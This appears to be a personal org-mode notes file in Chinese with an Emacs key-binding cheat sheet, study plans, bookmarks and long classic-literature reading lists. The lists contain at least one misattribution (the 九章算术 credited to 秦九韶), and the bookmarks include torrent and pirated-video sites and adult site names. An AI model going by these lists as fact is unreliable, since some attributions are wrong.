export GTK_IM_MODULE=xim
重启电脑，小企鹅就会开机自动启动了，通过CTRL+SPACE就可以使用小企鹅中文输入法。
*** emacs commands
语法
emacs(选项)(参数)
选项
+<行号>：启动emacs编辑器，并将光标移动到制定行号的行；
-q：启动emacs编辑器，而不加载初始化文件；
-u<用户>：启动emacs编辑器时，加载指定用户的初始化文件；
-t<文件>：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；
-f<函数>：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；
-l<lisp代码文件>：加载指定的lisp代码文件；
-batch：以批处理模式运行emacs编辑器。
参数
文件：指定要编辑的文本文件。

emacs命令操作大全
基本命令

C-x C-c : 退出Emacs
C-x C-f : 打开一个文件，如果文件不存在，则创建一个文件
C-g : 取消未完成的命令
编辑

C-z (redefined): Undo；原来C-z是挂起Emacs（然后用fg命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo
M-d : 删除光标后的词语
移动光标

C-v : 向前翻页
M-v : 向后翻页
M-r : 将光标移动到屏幕中间那行
C-a : 移到行首
M-a : 移到句首，从行首到句首之间可能有空格
C-e : 移到行尾
M-e : 移到句尾
M-{ : 向上移动一段
M-} : 向下移动一段
C-right : 向前移动一个单词
C-left : 向后移动一个单词
C-up : 向前移动一段
C-down : 向后移动一段
M-< : 移到整个文本开头
M-> : 移到整个文本末尾
C-u 数字 命令 : 执行多次(数字表示次数)该命令；"M-数字 命令" 也可以
M-x goto-line : 移动到某一行
C-l : 重绘屏幕，效果就是当前编辑行移动窗口中央
Buffer 相关

C-x k : 关闭当前buffer
C-x b : 切换到前一个编辑的buffer
C-x C-b : 列出当前所有buffer
C-x C-s : 保存当前buffer
C-x s : 保存所有未保存的buffer，会提示你是否需要保存
C-x C-w : 文件另存为
拷贝与粘贴

M-space (redefined): 设置mark; C-@ 是默认命令
C-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行
M-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行
C-k : 从当前位置剪切到行尾
C-y : 粘贴
M-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。
C-x r k : 执行矩形区域的剪切
C-x r y : 执行矩形区域的粘贴
窗口操作
C-x 0 : 关闭当前窗口
C-x 1 : 将当前窗口最大化
C-x 2 : 垂直分割窗口
C-x 3 : 水平分割窗口
M-o (redefined) : 在窗口之间切换; C-x o 是默认命令
C-x 5 1/2/3/0 : 对frame类似的操作
C-x < : 窗口内容右卷
C-x > : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）
(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行
(C-u) C-x } : 加宽当前窗口
(C-u) C-x { : 压窄当前窗口
ESC C-v : 在其它窗口进行卷屏操作
搜索和替换

C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标
C-s RET : 普通搜索
C-r : 向前搜索
C-s RET C-w : 按单词查询
M-% : 查询替换，也就是替换前会询问一下
M-x replace-string : 普通替换
Tags

M-! etags .c .h : 创建TAGS文件
M-. : 跳到tag所在位置
M-x list-tags : 列出tags
书签

C-x r m : 设置书签bookmark
C-x r b : 跳到bookmark处
帮助

C-h ? : 查看帮助信息
C-h f : 查看一个函数
C-h v : 查看一个变量
C-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)
C-h C-f : 查看一个函数的info，非常有用
C-h i : 看Info
其它

C-M-\ : 对选中区域，按照某种格式(比如C程序)进行格式化
C-x h : 全部选中
M-! : 执行外部shell命令
M-x shell : 模拟shell的buffer
M-x term : 模拟terminal, C-c k 关闭terminal
C-x C-q : 修改buffer的只读属性
*** org-mode
** programming
*** C
**** books
The C Programming Language,second edition
Expert C Programming,Peter.van.der.Linden

**** learning notebook

*** python
*** assembly language
*** java
** websites
*** trending
http://stackoverflow.com/
https://github.com/
https://news.ycombinator.com/news
*** programming
https://github.com/
https://about.gitlab.com/
http://stackoverflow.com/
https://www.gnu.org/
https://www.codecademy.com/

*** security

*** Operating System
https://www.linux.org/
https://www.kernel.org/
https://www.linuxfoundation.org/
https://kernelnewbies.org/
https://www.linux.com/
http://www.opendrivers.com/
https://www.debian.org/

*trending
https://www.reddit.com/
https://www.quora.com/
https://www.zhihu.com/
** hardware
HHKB
Realforce
WASD CODE
FILCO 圣手二代 /GKing2 代 / 忍者
cherry
notebook
sony DPT-RP1 CP1
** AI
*** Deep Learning
深度学习如何入门？
1、完成吴恩达机器学习课程的前五周，要做编程练习.
2、看完3Blue1Brown的视频。
3、完成吴恩达的深度学习专项系列课程，做练习。
4、如果你想搞图像，看专项课程第四讲，搞NLP或序列数据，看第五讲。
5、搜索你感兴趣的开源实现。如果你还没想好用什么语言，推荐Keras。然后根据需要，再迁到TensorFlow或者PyTorch框架。
斯坦福大学的CS231n和CS224ny
* interest
海贼王，Russia,Deutschland，France,美国Artifox公司设计的Desk 02,
** 奶粉：
澳大利亚：Devondale（德运），Maxigenes（美可卓），CapriLac（凯布瑞特）
新西兰：Anchor（安佳），a2
** literature
000.儒家十三经，即《周易》、《诗经》、《尚书》、《周礼》、《仪礼》、《礼记》、《左传》、《公羊传》、《谷梁传》、《论语》、《尔雅》、《孝经》、《孟子》
001.五经《诗经》《尚书》《礼记》《周易》《春秋》孔子整理（《春秋左氏传》左丘明)
002.四书《大学》《中庸》《论语》《孟子》
003.先秦百家《道德经》《庄子》《墨子》《荀子》《鬼谷子》《孙子兵法》《韩非子》
004.《山海经》
005.《楚辞》屈原
006.《吕氏春秋》吕不韦
007.《战国策》刘向
008.《淮南子》刘安
009.《史记》司马迁
010.《汉书》班固
012.《后汉书》范晔
013.《三国志》陈寿
014.《世说新语》刘义庆
015.《九章算术》秦九韶
016.《文心雕龙》刘勰
017.《杜甫诗》杜甫
018.《李白诗》李白
018.《资治通鉴》司马光
019.《西厢记》 王实甫
020. 《窦娥冤》 关汉卿
021. 《精忠旗》冯梦龙
022.《长生殿》洪昇
023.《赵氏孤儿》纪君祥
021.《三国演义》 罗贯中
022.《水浒传》 施耐庵
023.《西游记》吴承恩
024.《红楼梦》 曹雪芹 程伟元高鹗整理、无名氏续
025.《金瓶梅》 兰陵笑笑生
026. 《镜花缘》李汝珍
027. 《牡丹亭》汤显祖
028.《三言二拍》 （《三言》冯梦龙《二拍》凌濛初）
029. 《东周列国志》 冯梦龙著 蔡元放 改编
030.《聊斋志异》蒲松龄
031.《儒林外史》吴敬梓
032.《官场现形记》李宝嘉
034《孽海花》曾朴
035《二十年目睹之怪现状》吴趼人
036《老残游记》刘鹗
037.《封神演义》许仲琳
038.《徐霞客游记》徐霞客
039.《天工开物》宋应星
040.《本草纲目》李时珍
041.《菜根谭》洪应明
042. 《朝花夕拾·呐喊》鲁迅
043.《繁星· 春水》冰心
044.《骆驼祥子》《四世同堂》《茶馆》 老舍
045.《家》+《春》+《秋》=【激流三部曲】《雾》+《雨》+《电》=【爱情三部曲】巴金
046.《子夜》茅盾
047.《雷雨》曹禺
048. 《金锁记》《倾城之恋》《红玫瑰与白玫瑰》《色，戒》张爱玲
049. 《围城》钱钟书
050. 《傅雷家书》 傅雷
051. 《边城》 沈从文
法国
001.《伪君子》 莫里哀其他作品《喜剧六种》、《太太学堂》 《吝啬鬼》
002.《忏悔录》 卢梭
003.《嘉尔曼》 梅里美
004.《红与黑》 司汤达 其他作品《巴马修道院》
005.《欧也妮·葛朗台》 巴尔扎克其他作品《驴皮记》《交际花盛衰记》、《绝对之探求》《幻灭》 《高老头》（全集总纲《人间喜剧》）
006.《基督山伯爵》 大仲马 其他作品《玛戈王后的项链》、《四十五卫士》、《蒙梭罗夫人》《三个火枪手》（《三剑客》） （续集作品 《二十年后》、《布热日隆子爵》）
007《茶花女》 小仲马
008《包法利夫人》 福楼拜作家其他作品：《情感教育》
009《恶之花》 波德莱尔
010.《悲惨世界》 雨果 其他作品《冰岛恶魔》、《九三年》《海上劳工》《巴黎圣母院》《笑面人》
011.《莫泊桑中短篇小说集》 莫泊桑 其他作品 《俊友》
012.《萌芽》 左拉其他作品《小酒店》、《娜娜》、《金钱》
013.《约翰·克利斯朵夫》 罗曼·罗兰其他作品《名人传》
014.《追忆似水年华》 普鲁斯特
015.《局外人》《鼠疫》《西西弗的神话》 加缪
016.《情人》 杜拉斯
017.《巨人传》 拉伯雷
018.《蒙田随笔》 蒙田
019. 《海底两万里》儒勒·凡尔纳 其他作品《格兰特船长的女儿》、《神秘岛》《八十天环游地球记》
020. 《巴黎的秘密》欧仁·苏
021 《小王子》圣·埃克苏佩里
022《安德洛玛刻》 拉辛
023《费加罗的婚姻》 博马舍
024.《恭顺的妓女》萨特
025.《茫茫黑夜漫游》塞利纳
026.《亚森.罗宾探案全集》莫里斯.勒布朗
俄国
001.《普希金抒情诗选》 普希金. 其他作品 《上尉的女儿》.《叶甫盖妮·奥涅金》
002 《钦差大臣》 果戈理. 其他作品 《死魂灵》
003.《父与子》 屠格涅夫其他作品《猎人笔记》《前夜·贵族之家》
004.《战争与和平》 列夫·托尔斯泰其他作品 .《安娜·卡列尼娜》《复活》
005 《第四十一》拉夫列尼约夫
006.《卡拉马佐夫兄弟》 陀斯妥耶夫斯基其他作品 .《罪与罚》《白痴》《群魔》
007.《契诃夫短篇小说选》 契诃夫
008.《樱桃园》 契诃夫
009.《童年》 高尔基其他作品 《在人间》《我的大学》
010.《静静的顿河》 肖洛霍夫
011.《一个人的遭遇》 肖洛霍夫
012.《钢铁是怎样炼成的》 奥斯特洛夫斯基
013.《日瓦戈医生》 帕斯捷尔纳克
014.《彼得大帝》 阿·托尔斯泰其他作品《苦难的历程》
015. 《青年近卫军》 法捷耶夫其他作品 《毁灭》
016.《奥勃洛摩夫》 冈察洛夫
017. 《怎么办？》车尔尼雪夫斯基
018.《大雷雨》 奥斯特洛夫斯基
019.《这里的黎明静悄悄》瓦西里耶夫
020.《大师和玛格丽特》布尔加科夫其他作品《狗心》《不祥的蛋》
021.《癌症楼》索尔仁尼琴
022.《我们》叶·扎米亚京
德国
001.《少年维特之烦恼》 歌德
002.《浮士德》 歌德
003.《阴谋与爱情》 席勒
004.《海涅抒情诗选》 海涅 其他作品 《德国，一个冬天的童话》
005.《查拉图斯特拉如是说》 尼采
006.《布登勃洛克一家》 托马斯·曼其他作品《魔山》
007.《西线无战事》 雷马克
008.《铁皮鼓》 君特·格拉斯
009.《格林童话》格林兄弟
010.《荒原狼》黑塞
法国
028.《来，一只看不见的笛子》 雨果
029.《当一切入睡》 雨果
030.《黄昏的和谐》 波德莱尔
031.《烦闷》（二） 波德莱尔
032.《天鹅》马拉美
033.《月光》魏尔伦
034.《元音》兰波
035.《公园里》普列维尔
德国
036.《迷娘歌》 歌德
037.《相逢与别离》 歌德
038.《漫游者的夜歌》 歌德
039.《欢乐颂》 席勒
040.《乘着歌声的翅膀》海涅
041.《你就象一朵花》海涅
042.《醉歌》 尼采
043.《阴影的王国》 恩岑斯·贝格尔
苏俄
055.《致大海》 普希金
056.《致凯恩》 普希金
057.《假如生活欺骗了你》 普希金
058.《帆》莱蒙托夫
059.《云》 莱蒙托夫
060.《爱花园》阿赫马托娃
061.《开会迷》马雅可夫斯基
062.《我沿着初雪漫步……》叶塞宁
063.《我部叹惋、呼唤和哭泣》 叶塞宁
064.《我辞别了我出生的屋子》 叶塞宁
065.《我生性就是如此》 帕斯捷尔纳克
066.《喀秋莎》伊萨科夫斯基
067.《等着我吧》西蒙诺夫

** Russia
*** literature
普希金的诗体小说《叶甫盖尼奥涅金》《上尉的女儿》和他的短篇小说
果戈里《死魂灵》《钦差大臣》
屠格涅夫《猎人笔记》
陀思妥耶夫斯基《罪与罚》《卡拉马佐夫兄弟》
列夫托尔斯泰《战争与和平》《安娜·卡列尼娜》《复活》
契诃夫的短篇小说，戏剧《樱桃园》《万尼亚舅舅》《海鸥》
吉皮乌斯的诗
勃洛克的诗别雷《彼得堡》
阿赫玛托娃的诗帕斯捷尔纳克《日瓦戈医生》
茨维塔耶娃的诗
蒲宁的短篇小说
布尔加科夫《大师与玛格丽特》
拉斯普京
布罗茨基的诗
巴别尔《骑兵军》
布尔加科夫《孽卵》《大师和玛格丽特》
肖洛霍夫《静静的顿河》
帕斯捷尔纳克《日瓦戈医生》
** Deutschland
《新标准德语强化教程》1～3册啊，这是外研社引进的原版教材，是德国著名的Hueber社（专于出版德语教材的一个大社）出版的Themen aktuell系列教材，
分别对应欧洲语言共同标准A1, A2, B1, 词汇量巨大；除此之外还需要增加正式文体多一些的Begegnungen和Erkundungen系列教材，强化语法阅读和写作.
歌德学院官方的 MitErfolg zum Goethe-Zertifikat B1, B2, C1, TestDAF，以及Telc B2
标准德语语法--精解与练习
德语词汇联想与速记

* Vedio
https://eztv.ag/
https://rarbg.is/torrents.php
http://www.ttmeiju.vip/
http://www.addic7ed.com/
* course
https://www.coursera.org/
https://opensource.com/
https://www.edx.org/
https://www.icourse163.org/
http://open.163.com/
http://www.mooc.cn/
https://www.freecodecamp.org/
* websites
pornhub,1024,草榴，春天的故事
* TODO become a graduate

保姆
大润发房子
小秦发文
长春取钱贴膜后备箱垫
吉大二院检查
